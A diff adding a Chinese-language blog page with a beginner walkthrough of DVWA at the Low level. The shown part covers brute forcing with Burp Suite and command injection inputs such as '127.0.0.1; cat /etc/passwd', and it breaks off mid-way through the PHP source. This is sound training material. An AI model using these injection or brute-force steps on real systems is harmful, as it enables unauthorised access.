@@ -1,0 +1,1931 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DVWA Low 难度通关教程（零基础友好版） 适用对象：完全没有 Web 安全基础的同学环境要求：已安装并成功运行 DVWA（推荐使用 Docker 一键部署）安全声明：本教程仅用于学习目的，请勿用于非法攻击   目录 一、DVWA 简介与环境准备 二、Brute Force（暴力破解） 三、Command Injection（命令注入） 四、CSRF（跨站请求伪造） 五、File Inclus">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA_Low_通关教程">
+<meta property="og:url" content="https://chiya-66.github.io/2026/07/18/DVWA_Low_%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="DVWA Low 难度通关教程（零基础友好版） 适用对象：完全没有 Web 安全基础的同学环境要求：已安装并成功运行 DVWA（推荐使用 Docker 一键部署）安全声明：本教程仅用于学习目的，请勿用于非法攻击   目录 一、DVWA 简介与环境准备 二、Brute Force（暴力破解） 三、Command Injection（命令注入） 四、CSRF（跨站请求伪造） 五、File Inclus">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-17T16:55:18.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.359Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>DVWA_Low_通关教程 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DVWA_Low_通关教程"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-07-18 00:55" pubdate>
+          2026年7月18日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          167 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DVWA_Low_通关教程</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DVWA-Low-难度通关教程（零基础友好版）"><a href="#DVWA-Low-难度通关教程（零基础友好版）" class="headerlink" title="DVWA Low 难度通关教程（零基础友好版）"></a>DVWA Low 难度通关教程（零基础友好版）</h1><blockquote>
+<p><strong>适用对象</strong>：完全没有 Web 安全基础的同学<br><strong>环境要求</strong>：已安装并成功运行 DVWA（推荐使用 Docker 一键部署）<br><strong>安全声明</strong>：本教程仅用于学习目的，请勿用于非法攻击</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80dvwa-%E7%AE%80%E4%BB%8B%E4%B8%8E%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">一、DVWA 简介与环境准备</a></li>
+<li><a href="#%E4%BA%8Cbrute-force%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">二、Brute Force（暴力破解）</a></li>
+<li><a href="#%E4%B8%89command-injection%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">三、Command Injection（命令注入）</a></li>
+<li><a href="#%E5%9B%9Bcsrf%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">四、CSRF（跨站请求伪造）</a></li>
+<li><a href="#%E4%BA%94file-inclusion%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">五、File Inclusion（文件包含）</a></li>
+<li><a href="#%E5%85%ADfile-upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">六、File Upload（文件上传）</a></li>
+<li><a href="#%E4%B8%83sql-injectionsql-%E6%B3%A8%E5%85%A5">七、SQL Injection（SQL 注入）</a></li>
+<li><a href="#%E5%85%ABsql-injectionblind%E7%9B%B2%E6%B3%A8">八、SQL Injection（Blind）（盲注）</a></li>
+<li><a href="#%E4%B9%9Dxssreflected%E5%8F%8D%E5%B0%84%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC">九、XSS（Reflected）（反射型跨站脚本）</a></li>
+<li><a href="#%E5%8D%81xssstored%E5%AD%98%E5%82%A8%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC">十、XSS（Stored）（存储型跨站脚本）</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80xssdomdom-%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC">十一、XSS（DOM）（DOM 型跨站脚本）</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE">十二、总结与学习建议</a></li>
+</ul>
+<hr>
+<h2 id="一、DVWA-简介与环境准备"><a href="#一、DVWA-简介与环境准备" class="headerlink" title="一、DVWA 简介与环境准备"></a>一、DVWA 简介与环境准备</h2><h3 id="1-1-什么是-DVWA？"><a href="#1-1-什么是-DVWA？" class="headerlink" title="1.1 什么是 DVWA？"></a>1.1 什么是 DVWA？</h3><p>DVWA（Damn Vulnerable Web Application）是一个<strong>故意设计得漏洞百出</strong>的 Web 应用程序。它的目的不是给你做一个好网站，而是给你一个<strong>合法的靶场</strong>，让你练习如何发现和利用 Web 漏洞。</p>
+<p>打个比方：DVWA 就像是一个”拆弹训练场”——里面放置了各种不同类型的”炸弹”（漏洞），你在里面练习拆弹，练好了以后才能在真实场景中保护系统。</p>
+<h3 id="1-2-安全级别说明"><a href="#1-2-安全级别说明" class="headerlink" title="1.2 安全级别说明"></a>1.2 安全级别说明</h3><p>DVWA 有四个安全级别：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Low</strong></td>
+<td>毫无防护，代码直接把用户输入传给后端处理</td>
+</tr>
+<tr>
+<td><strong>Medium</strong></td>
+<td>做了一些简单的过滤</td>
+</tr>
+<tr>
+<td><strong>High</strong></td>
+<td>做了较严格的防护</td>
+</tr>
+<tr>
+<td><strong>Impossible</strong></td>
+<td>使用了安全编码的最佳实践，基本无法攻破</td>
+</tr>
+</tbody></table>
+<p>本教程使用 <strong>Low</strong> 级别，因为在这个级别下，代码没有任何防护措施，非常适合零基础同学理解<strong>漏洞的本质原理</strong>。</p>
+<h3 id="1-3-环境准备"><a href="#1-3-环境准备" class="headerlink" title="1.3 环境准备"></a>1.3 环境准备</h3><ol>
+<li>确保 DVWA 已经启动并能正常访问</li>
+<li>在浏览器中打开 DVWA 页面</li>
+<li>使用默认账号登录：用户名 <code>admin</code>，密码 <code>password</code></li>
+<li>登录后，点击左侧的 <strong>DVWA Security</strong>，将安全级别设置为 <strong>low</strong>，然后点击 <strong>Submit</strong></li>
+</ol>
+<blockquote>
+<p><strong>提示</strong>：每次切换关卡后，最好确认安全级别仍然是 low，因为某些操作可能会重置它。</p>
+</blockquote>
+<h3 id="1-4-几个必须理解的前置概念"><a href="#1-4-几个必须理解的前置概念" class="headerlink" title="1.4 几个必须理解的前置概念"></a>1.4 几个必须理解的前置概念</h3><p>在开始之前，你需要了解几个基础概念：</p>
+<p><strong>前端与后端</strong></p>
+<ul>
+<li><strong>前端</strong>：你在浏览器里看到的东西——按钮、输入框、页面排版。前端代码（HTML&#x2F;CSS&#x2F;JavaScript）运行在你的浏览器里。</li>
+<li><strong>后端</strong>：服务器上运行的程序——处理数据、读写数据库、执行业务逻辑。后端代码（PHP&#x2F;Python&#x2F;Java 等）运行在服务器上。</li>
+<li>漏洞通常出现在<strong>后端没有正确验证和处理前端传来的数据</strong>。</li>
+</ul>
+<p><strong>HTTP 请求</strong></p>
+<ul>
+<li>当你在网页上填写表单并点击提交时，浏览器会向服务器发送一个 <strong>HTTP 请求</strong>。</li>
+<li>这个请求包含了你输入的所有数据。</li>
+<li>攻击的核心思路就是：<strong>在发送给服务器的数据中夹带”恶意内容”</strong>。</li>
+</ul>
+<p><strong>数据库</strong></p>
+<ul>
+<li>网站的数据（用户名、密码、文章内容等）存储在<strong>数据库</strong>中。</li>
+<li>后端程序通过 <strong>SQL 语言</strong>来操作数据库（增删改查）。</li>
+<li>如果后端直接把用户输入拼接到 SQL 语句中，就会产生 <strong>SQL 注入</strong>漏洞。</li>
+</ul>
+<hr>
+<h2 id="二、Brute-Force（暴力破解）"><a href="#二、Brute-Force（暴力破解）" class="headerlink" title="二、Brute Force（暴力破解）"></a>二、Brute Force（暴力破解）</h2><h3 id="2-1-这个漏洞是什么？"><a href="#2-1-这个漏洞是什么？" class="headerlink" title="2.1 这个漏洞是什么？"></a>2.1 这个漏洞是什么？</h3><p>暴力破解，简单来说就是<strong>不停地尝试不同的用户名和密码组合，直到猜对为止</strong>。</p>
+<p>就像你忘了自己行李箱的密码锁，就从 000 开始一个一个试，试到 999 总能打开。网站登录也是一样——如果网站不限制尝试次数，攻击者就可以用程序自动尝试成千上万个密码。</p>
+<h3 id="2-2-前置知识：HTTP-请求中的表单提交"><a href="#2-2-前置知识：HTTP-请求中的表单提交" class="headerlink" title="2.2 前置知识：HTTP 请求中的表单提交"></a>2.2 前置知识：HTTP 请求中的表单提交</h3><p>当你登录一个网站时，浏览器会发送类似这样的请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/dvwa/vulnerabilities/brute/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-pgsql">username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">password</span>&amp;<span class="hljs-keyword">Login</span>=<span class="hljs-keyword">Login</span></span><br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>username=admin&amp;password=password</code> 就是你提交的用户名和密码。暴力破解的核心就是<strong>自动、反复地发送这样的请求</strong>，每次换一个密码。</p>
+<h3 id="2-3-手动尝试"><a href="#2-3-手动尝试" class="headerlink" title="2.3 手动尝试"></a>2.3 手动尝试</h3><ol>
+<li>点击左侧菜单的 <strong>Brute Force</strong></li>
+<li>你会看到一个登录表单，有用户名和密码输入框</li>
+<li>先手动试一下：输入 <code>admin</code> &#x2F; <code>password</code>，点击 Login</li>
+<li>登录成功后会显示用户名和密码</li>
+</ol>
+<h3 id="2-4-使用-Burp-Suite-进行暴力破解"><a href="#2-4-使用-Burp-Suite-进行暴力破解" class="headerlink" title="2.4 使用 Burp Suite 进行暴力破解"></a>2.4 使用 Burp Suite 进行暴力破解</h3><p>虽然手动也能试，但要试几百个密码就不现实了。我们需要一个工具来<strong>自动化</strong>这个过程。</p>
+<p><strong>Burp Suite</strong> 是一款常用的 Web 安全测试工具，它的核心功能之一就是<strong>拦截和修改浏览器与服务器之间的通信</strong>。</p>
+<h4 id="第一步：配置-Burp-Suite-代理"><a href="#第一步：配置-Burp-Suite-代理" class="headerlink" title="第一步：配置 Burp Suite 代理"></a>第一步：配置 Burp Suite 代理</h4><ol>
+<li>打开 Burp Suite</li>
+<li>进入 <strong>Proxy</strong> 选项卡 → <strong>Options</strong> → 确认代理监听端口为 <code>8080</code></li>
+<li>在浏览器中设置代理为 <code>127.0.0.1:8080</code></li>
+</ol>
+<h4 id="第二步：抓取登录请求"><a href="#第二步：抓取登录请求" class="headerlink" title="第二步：抓取登录请求"></a>第二步：抓取登录请求</h4><ol>
+<li>在 DVWA 的 Brute Force 页面，随意输入用户名和密码（比如 admin&#x2F;123456）</li>
+<li>点击 Login</li>
+<li>回到 Burp Suite，在 <strong>Proxy → HTTP history</strong> 中找到这个登录请求</li>
+<li>右键该请求 → <strong>Send to Intruder</strong>（发送到入侵模块）</li>
+</ol>
+<h4 id="第三步：配置攻击参数"><a href="#第三步：配置攻击参数" class="headerlink" title="第三步：配置攻击参数"></a>第三步：配置攻击参数</h4><ol>
+<li>切换到 <strong>Intruder</strong> 选项卡</li>
+<li>在 <strong>Positions</strong> 标签中，你会看到请求内容</li>
+<li>找到 <code>password=123456</code> 这部分</li>
+<li>在 <code>123456</code> 两边点击 <strong>Add §</strong> 按钮，使其变成 <code>password=§123456§</code><ul>
+<li><code>§</code> 符号标记了”攻击位置”，Burp 会自动替换这个位置的值</li>
+</ul>
+</li>
+<li>在 <strong>Payloads</strong> 标签中：<ul>
+<li>Payload type 选择 <strong>Simple list</strong></li>
+<li>在下方文本框中输入常见密码（每行一个），比如：<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">123456</span><br><span class="hljs-keyword">password</span><br><span class="hljs-keyword">admin</span><br>letmein<br>qwerty<br>abc123<br>monkey<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>点击 <strong>Start attack</strong> 开始攻击</li>
+</ol>
+<h4 id="第四步：分析结果"><a href="#第四步：分析结果" class="headerlink" title="第四步：分析结果"></a>第四步：分析结果</h4><ul>
+<li>攻击完成后会弹出一个窗口，显示每次尝试的结果</li>
+<li>关注 <strong>Status</strong> 列（HTTP 状态码）和 <strong>Length</strong> 列（响应长度）</li>
+<li>找到长度明显不同的那行——通常成功登录的页面和失败页面的长度不同</li>
+<li>点击该行，在右侧查看响应内容，确认是否登录成功</li>
+</ul>
+<h3 id="2-5-知识点总结"><a href="#2-5-知识点总结" class="headerlink" title="2.5 知识点总结"></a>2.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>暴力破解</td>
+<td>尝试所有可能的密码组合直到猜中</td>
+</tr>
+<tr>
+<td>Burp Suite</td>
+<td>拦截浏览器和服务器之间通信的工具</td>
+</tr>
+<tr>
+<td>代理（Proxy）</td>
+<td>让浏览器的流量先经过 Burp Suite，从而可以查看和修改</td>
+</tr>
+<tr>
+<td>Intruder</td>
+<td>Burp Suite 的自动化攻击模块</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td>攻击载荷，即要尝试的密码列表</td>
+</tr>
+</tbody></table>
+<h3 id="2-6-防御方法"><a href="#2-6-防御方法" class="headerlink" title="2.6 防御方法"></a>2.6 防御方法</h3><ul>
+<li><strong>限制登录尝试次数</strong>：连续失败 N 次后锁定账户或增加验证码</li>
+<li><strong>使用强密码</strong>：长而复杂的密码让暴力破解变得不现实</li>
+<li><strong>添加验证码</strong>：区分人类和自动化程序</li>
+<li><strong>账号锁定机制</strong>：多次失败后临时锁定</li>
+</ul>
+<hr>
+<h2 id="三、Command-Injection（命令注入）"><a href="#三、Command-Injection（命令注入）" class="headerlink" title="三、Command Injection（命令注入）"></a>三、Command Injection（命令注入）</h2><h3 id="3-1-这个漏洞是什么？"><a href="#3-1-这个漏洞是什么？" class="headerlink" title="3.1 这个漏洞是什么？"></a>3.1 这个漏洞是什么？</h3><p><strong>命令注入</strong>是指攻击者通过在用户输入中嵌入<strong>操作系统命令</strong>，让服务器执行了本不该执行的命令。</p>
+<p>打个比方：一个网站有一个功能是”查询 IP 地址”，你输入一个 IP，服务器会执行 <code>ping 你的IP</code> 这个系统命令。但如果网站没有做检查，你输入 <code>127.0.0.1; ls</code>，服务器实际执行的就变成了：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">; ls</span><br></code></pre></td></tr></table></figure>
+
+<p><code>ls</code> 是 Linux 列出文件列表的命令。服务器不仅 ping 了 IP，还把当前目录的文件列表展示了出来——这就是命令注入。</p>
+<h3 id="3-2-前置知识：Linux-常用命令"><a href="#3-2-前置知识：Linux-常用命令" class="headerlink" title="3.2 前置知识：Linux 常用命令"></a>3.2 前置知识：Linux 常用命令</h3><p>在开始之前，你需要知道几个基本的 Linux 命令：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls</code></td>
+<td>列出当前目录下的文件和文件夹</td>
+</tr>
+<tr>
+<td><code>cat 文件名</code></td>
+<td>查看文件内容</td>
+</tr>
+<tr>
+<td><code>pwd</code></td>
+<td>显示当前所在目录</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>显示当前用户</td>
+</tr>
+<tr>
+<td><code>ifconfig</code> 或 <code>ip a</code></td>
+<td>查看网络配置</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>显示用户ID和组ID</td>
+</tr>
+<tr>
+<td><code>uname -a</code></td>
+<td>显示系统信息</td>
+</tr>
+</tbody></table>
+<h3 id="3-3-前置知识：命令连接符"><a href="#3-3-前置知识：命令连接符" class="headerlink" title="3.3 前置知识：命令连接符"></a>3.3 前置知识：命令连接符</h3><p>命令注入的核心在于<strong>命令连接符</strong>，它们允许你在一个命令后面追加另一个命令：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+<th>举例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>顺序执行，不管前面成功失败</td>
+<td><code>命令1; 命令2</code> → 先执行1，再执行2</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>前面成功才执行后面</td>
+<td><code>命令1 &amp;&amp; 命令2</code> → 1成功才执行2</td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>前面命令的输出作为后面命令的输入（管道）</td>
+<td><code>ls | grep txt</code> → 列出包含txt的文件</td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td></td>
+<td>&#96;</td>
+</tr>
+<tr>
+<td><code>`</code> （反引号）</td>
+<td>执行反引号内的命令，把输出插入到原命令中</td>
+<td><code>echo </code>whoami&#96;&#96; → 显示当前用户名</td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td>和反引号类似，执行括号内命令</td>
+<td><code>echo $(whoami)</code></td>
+</tr>
+</tbody></table>
+<h3 id="3-4-动手实践"><a href="#3-4-动手实践" class="headerlink" title="3.4 动手实践"></a>3.4 动手实践</h3><ol>
+<li>点击左侧的 <strong>Command Injection</strong></li>
+<li>你会看到一个输入框，提示你输入一个 IP 地址</li>
+<li>输入 <code>127.0.0.1</code>，点击 Submit</li>
+<li>你会看到 ping 的结果——这是正常使用</li>
+</ol>
+<p>现在我们来注入命令：</p>
+<p><strong>步骤 1：执行额外命令</strong></p>
+<p>在输入框中输入：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>; ls<br></code></pre></td></tr></table></figure>
+
+<p>点击 Submit，你会看到 ping 结果的后面，<strong>多了文件列表</strong>。这说明 <code>ls</code> 命令被服务器执行了。</p>
+<p><strong>步骤 2：查看当前用户</strong></p>
+<p>输入：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>; whoami<br></code></pre></td></tr></table></figure>
+
+<p>你会看到服务器返回了 <code>www-data</code>（这是 Apache 服务器默认使用的用户）。</p>
+<p><strong>步骤 3：查看密码文件</strong></p>
+<p>输入：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>; cat /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>这个文件存储了 Linux 系统中所有用户的信息。你能看到一系列用户记录。</p>
+<p><strong>步骤 4：查看当前目录路径</strong></p>
+<p>输入：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>; pwd<br></code></pre></td></tr></table></figure>
+
+<p>你会看到 DVWA 所在的目录路径。</p>
+<h3 id="3-5-漏洞原理（源码分析）"><a href="#3-5-漏洞原理（源码分析）" class="headerlink" title="3.5 漏洞原理（源码分析）"></a>3.5 漏洞原理（源码分析）</h3><p>点击 DVWA 页面右下角的 <strong>View Source</strong> 按钮，查看 Low 级别的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ 